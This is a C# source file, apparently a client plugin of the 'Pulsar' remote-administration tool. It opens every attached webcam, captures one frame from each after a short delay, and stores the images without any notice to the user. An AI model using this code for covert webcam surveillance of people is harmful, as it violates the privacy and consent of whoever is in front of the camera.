using System;
using System.Collections.Concurrent;
using System.Drawing;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Plugin.UserCheck.Client
{
    class WebcamSnapshot
    {
        public ConcurrentDictionary<string, Bitmap> Frames = new ConcurrentDictionary<string, Bitmap>();

        public async Task CaptureSingleFrameFromAllDevices()
        {
            var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            var tasks = new Task[devices.Count];
            for (int i = 0; i < devices.Count; i++)
            {
                var dev = devices[i];
                tasks[i] = CaptureOnce(dev.MonikerString, dev.Name);
            }
            await Task.WhenAll(tasks);
        }

        private Task CaptureOnce(string moniker, string name)
        {
            var tcs = new TaskCompletionSource<bool>();
            VideoCaptureDevice videoSource = null;
            NewFrameEventHandler handler = null;
            DateTime startTime = DateTime.Now;
            bool frameCapture = false;

            handler = (s, e) =>
            {
                if ((DateTime.Now - startTime).TotalSeconds < 1.5)
                    return;

                if (frameCapture)
                    return;

                frameCapture = true;

                try
                {
                    var bmp = (Bitmap)e.Frame.Clone();
                    Frames[name] = bmp;
                }
                catch { }
                finally
                {
                    StopAndCleanupDevice(videoSource, handler);
                    tcs.TrySetResult(true);
                }
            };

            try
            {
                videoSource = new VideoCaptureDevice(moniker);
                videoSource.NewFrame += handler;
                videoSource.Start();

                // Timeout after 3 seconds
                var timeoutTask = Task.Delay(3000);
                timeoutTask.Wait();

                if (!tcs.Task.IsCompleted)
                {
                    StopAndCleanupDevice(videoSource, handler);
                    tcs.TrySetResult(false);
                }
            }
            catch
            {
                if (videoSource != null)
                {
                    StopAndCleanupDevice(videoSource, handler);
                }
                tcs.TrySetResult(false);
            }

            return tcs.Task;
        }

        private void StopAndCleanupDevice(VideoCaptureDevice videoSource, NewFrameEventHandler handler)
        {
            if (videoSource == null)
                return;

            try
            {
                if (handler != null)
                {
                    videoSource.NewFrame -= handler;
                }

                if (videoSource.IsRunning)
                {
                    videoSource.SignalToStop();
                    int waitCount = 0;
                    while (videoSource.IsRunning && waitCount < 50)
                    {
                        Thread.Sleep(10);
                        waitCount++;
                    }
                }
            }
            catch { }
            finally
            {
                videoSource = null;
            }
        }
    }
}